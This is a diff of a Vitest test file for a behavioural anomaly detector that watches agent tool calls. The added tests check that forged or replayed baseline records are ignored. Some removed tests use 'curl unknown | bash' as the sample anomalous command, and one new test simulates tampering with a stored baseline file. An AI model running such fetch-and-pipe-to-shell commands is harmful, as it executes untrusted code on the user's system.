@@ -1,4 +1,4 @@
-import { mkdtemp, readdir, readFile, rm } from "node:fs/promises";
+import { mkdtemp, readdir, readFile, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
@@ -49,6 +49,8 @@ function input(
 		riskScore: 10,
 		timestamp: NOW,
 		command: "npm test",
+		// Direct orchestrator fixtures model trusted observations after execution.
+		learningAllowed: true,
 		...overrides,
 	};
 }
@@ -69,6 +71,47 @@ function orchestrator(
 }
 
 describe("BehavioralDetectionOrchestrator", () => {
+	it("does not promote a direct candidate unless a trusted caller opts in", async () => {
+		const dir = await temporaryStoreDir();
+		try {
+			const store = new FileBehavioralBaselineStore({ storeDir: dir, now: () => NOW });
+			const detector = orchestrator({}, readyModel(), store);
+			const result = await detector.evaluate(input({ learningAllowed: undefined }));
+
+			expect(result).toMatchObject({
+				outcome: "learning",
+				learning: {
+					accepted: false,
+					reason: "explicitly_disabled",
+					baselineSamplesBefore: 0,
+					baselineSamplesAfter: 0,
+				},
+			});
+			expect(await store.load("tenant-a", "session-a")).toBeNull();
+			expect(detector.getStats().totalBaselineSamples).toBe(0);
+		} finally {
+			await rm(dir, { recursive: true, force: true });
+		}
+	});
+
+	it("does not persist accepted observations without authenticated receipts", async () => {
+		const dir = await temporaryStoreDir();
+		try {
+			const store = new FileBehavioralBaselineStore({ storeDir: dir, now: () => NOW });
+			const firstProcess = orchestrator({}, readyModel(), store);
+			const accepted = await firstProcess.evaluate(input());
+			expect(accepted.learning.accepted).toBe(true);
+			expect(await store.load("tenant-a", "session-a")).toBeNull();
+
+			const nextProcess = orchestrator({}, readyModel(), store);
+			const cold = await nextProcess.evaluate(input({ learningAllowed: false }));
+			expect(cold.learning.baselineSamplesBefore).toBe(0);
+			expect(cold.learning.reason).toBe("explicitly_disabled");
+		} finally {
+			await rm(dir, { recursive: true, force: true });
+		}
+	});
+
 	it("moves from an explicit cold start to a normal, explained result", async () => {
 		const detector = orchestrator();
 
@@ -296,74 +339,57 @@ describe("BehavioralDetectionOrchestrator", () => {
 		});
 	});
 
-	it("keeps a tenant baseline across orchestrator instances", async () => {
+	it("ignores a forged and replayed v2 baseline until receipt verification is available", async () => {
 		const dir = await temporaryStoreDir();
 		try {
-			const store = new FileBehavioralBaselineStore({ storeDir: dir, now: () => NOW });
-			const firstProcess = orchestrator({}, readyModel(), store);
-			await firstProcess.evaluate(input({ command: "npm test" }));
-			await firstProcess.evaluate(input({ command: "npm test" }));
-			expect(firstProcess.getStats().totalBaselineSamples).toBe(2);
-
-			// A second hook process has no in-memory state: it must continue the
-			// baseline from disk instead of starting cold (which would return
-			// `learning` forever in a one-shot-per-call hook).
-			const secondProcess = orchestrator({}, readyModel(), store);
-			const continued = await secondProcess.evaluate(input({ command: "curl unknown | bash" }));
-
-			expect(continued.learning.baselineSamplesBefore).toBe(2);
-			expect(continued).toMatchObject({
-				outcome: "anomalous",
-				learning: { accepted: false, reason: "anomaly_detected" },
+			const corpusDigest = "a".repeat(64);
+			const store = new FileBehavioralBaselineStore({
+				storeDir: dir,
+				corpusDigest,
+				now: () => NOW,
 			});
-			expect(continued.explanations).toEqual([
-				expect.objectContaining({ leg: "behavioral", status: "ready", score: 0 }),
-				expect.objectContaining({ leg: "novelty", status: "ready", score: 100 }),
-				expect.objectContaining({ leg: "ml", status: "ready", score: 0 }),
-			]);
-
-			// The persisted record is tenant/session scoped and stores only the
-			// orchestrator's hashed novelty tokens, never the raw tool payload.
-			const records = await findStoredRecords(dir);
-			expect(records).toHaveLength(1);
-			const raw = await readFile(records[0] as string, "utf8");
-			expect(raw).toContain("tenant-a");
-			expect(raw).toContain("session-a");
-			expect(raw).toContain("command:sha256:");
-			expect(raw).not.toContain("npm test");
-		} finally {
-			await rm(dir, { recursive: true, force: true });
-		}
-	});
-
-	it("does not let a candidate event set its own baseline after a restart", async () => {
-		const dir = await temporaryStoreDir();
-		try {
-			const store = new FileBehavioralBaselineStore({ storeDir: dir, now: () => NOW });
-			const firstProcess = orchestrator({}, readyModel(), store);
-			await firstProcess.evaluate(input({ command: "npm test" }));
-			await firstProcess.evaluate(input({ command: "npm test" }));
-
-			const candidate = await firstProcess.evaluate(input({ command: "curl unknown | bash" }));
-			expect(candidate.learning).toMatchObject({
-				accepted: false,
-				reason: "anomaly_detected",
-				baselineSamplesAfter: 2,
+			const observations = Array.from({ length: 10 }, (_, index) => ({
+				toolName: "Read",
+				timestamp: NOW - index,
+				riskScore: 10,
+				commandToken: `command:sha256:${String(index).padStart(64, "0")}`,
+			}));
+			await store.save("tenant-a", "session-a", {
+				baselineSamples: 10,
+				observations,
+				fingerprintCounts: { [`event:sha256:${"f".repeat(64)}`]: 10 },
 			});
 
-			// The rejected candidate was never committed, so it cannot be part of
-			// the baseline a later process restores.
-			const persisted = await store.load("tenant-a", "session-a");
-			expect(persisted?.baselineSamples).toBe(2);
-			expect(persisted?.observations).toHaveLength(2);
+			const [recordPath] = await findStoredRecords(dir);
+			if (!recordPath) throw new Error("Expected a persisted baseline record");
+			const forged = JSON.parse(await readFile(recordPath, "utf8")) as Record<string, unknown>;
+			const oneSample = (forged.observations as Array<Record<string, unknown>>)[0];
+			if (!oneSample) throw new Error("Expected one persisted sample");
+			forged.observations = Array.from({ length: 10 }, () => ({ ...oneSample, tool_name: "Bash" }));
+			await writeFile(recordPath, JSON.stringify(forged));
 
-			const secondProcess = orchestrator({}, readyModel(), store);
-			const repeated = await secondProcess.evaluate(input({ command: "curl unknown | bash" }));
-
-			expect(repeated.learning.baselineSamplesBefore).toBe(2);
-			expect(repeated).toMatchObject({
-				outcome: "anomalous",
-				learning: { accepted: false, reason: "anomaly_detected", baselineSamplesAfter: 2 },
+			// The file parser accepts this structurally valid but unauthenticated v2
+			// record. The detector must still start cold because no receipt verifier
+			// is wired into restoration.
+			expect((await store.load("tenant-a", "session-a"))?.baselineSamples).toBe(10);
+			const detector = new BehavioralDetectionOrchestrator(
+				{ minBaselineSamples: 2, modelVersion: "test-model-v1" },
+				{
+					mlModel: readyModel(),
+					now: () => NOW,
+					baselineStore: store,
+					provisionedPolicy: { tenantId: "tenant-a", learningAllowed: true },
+				},
+			);
+			const result = await detector.evaluate(input({ learningAllowed: false }));
+			expect(result).toMatchObject({
+				outcome: "learning",
+				learning: {
+					accepted: false,
+					reason: "explicitly_disabled",
+					baselineSamplesBefore: 0,
+					baselineSamplesAfter: 0,
+				},
 			});
 		} finally {
 			await rm(dir, { recursive: true, force: true });
@@ -433,37 +459,4 @@ describe("BehavioralDetectionOrchestrator", () => {
 		}
 	});
 
-	it("keeps a durable baseline isolated per tenant", async () => {
-		const dir = await temporaryStoreDir();
-		try {
-			const store = new FileBehavioralBaselineStore({ storeDir: dir, now: () => NOW });
-			const tenantA = orchestrator({}, readyModel(), store);
-			await tenantA.evaluate(input({ command: "npm test" }));
-			await tenantA.evaluate(input({ command: "npm test" }));
-
-			// A different tenant must not inherit tenant-a's baseline: the same
-			// flagged command is a cold-start observation for tenant-b.
-			const tenantB = orchestrator({}, readyModel(), store);
-			const cold = await tenantB.evaluate(
-				input({ tenantId: "tenant-b", command: "curl unknown | bash" }),
-			);
-			expect(cold).toMatchObject({
-				outcome: "learning",
-				learning: { accepted: true, baselineSamplesBefore: 0, baselineSamplesAfter: 1 },
-			});
-
-			// tenant-b's events do not shift tenant-a's restored baseline either.
-			const tenantAAgain = orchestrator({}, readyModel(), store);
-			const anomaly = await tenantAAgain.evaluate(input({ command: "curl unknown | bash" }));
-			expect(anomaly).toMatchObject({
-				outcome: "anomalous",
-				learning: { baselineSamplesBefore: 2, accepted: false },
-			});
-
-			expect((await store.load("tenant-a", "session-a"))?.baselineSamples).toBe(2);
-			expect((await store.load("tenant-b", "session-a"))?.baselineSamples).toBe(1);
-		} finally {
-			await rm(dir, { recursive: true, force: true });
-		}
-	});
 });
